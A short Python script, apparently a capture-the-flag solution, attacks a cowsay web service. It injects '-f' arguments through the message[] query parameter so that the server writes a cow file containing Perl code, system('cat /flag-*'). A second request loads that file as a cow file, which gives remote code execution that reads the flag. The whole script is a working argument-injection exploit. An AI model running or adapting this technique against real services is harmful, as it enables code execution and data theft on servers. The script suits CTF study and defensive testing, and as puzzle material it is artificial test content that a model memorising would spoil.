import os
import httpx
from urllib.parse import quote

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", 3000))

client = httpx.Client(base_url=f"http://{HOST}:{PORT}")

def cowsay(messages: list[str]) -> str:
  uuid = client.get(f"/say?{"&".join([f"message[]={quote(m)}" for m in messages])}").json()["uuid"]
  return uuid

messages = ["-f", "suse", 'system("cat /flag-*"); s@']
uuid = cowsay(messages)
print(f"{uuid = }")

# ./{uuid}:
# ```perl
#  ___________________________
# < system("cat /flag-*"); s@ >
#  ---------------------------
#   \
#    \____
#   /@    ~-.
#   \/ __ .- |
#    // //  @
# ````

messages = ["-f", f"./{uuid}", "RCE with Cowsay Assistance!"]
uuid = cowsay(messages)
out = client.get(f"/out/{uuid}").text
print(out)
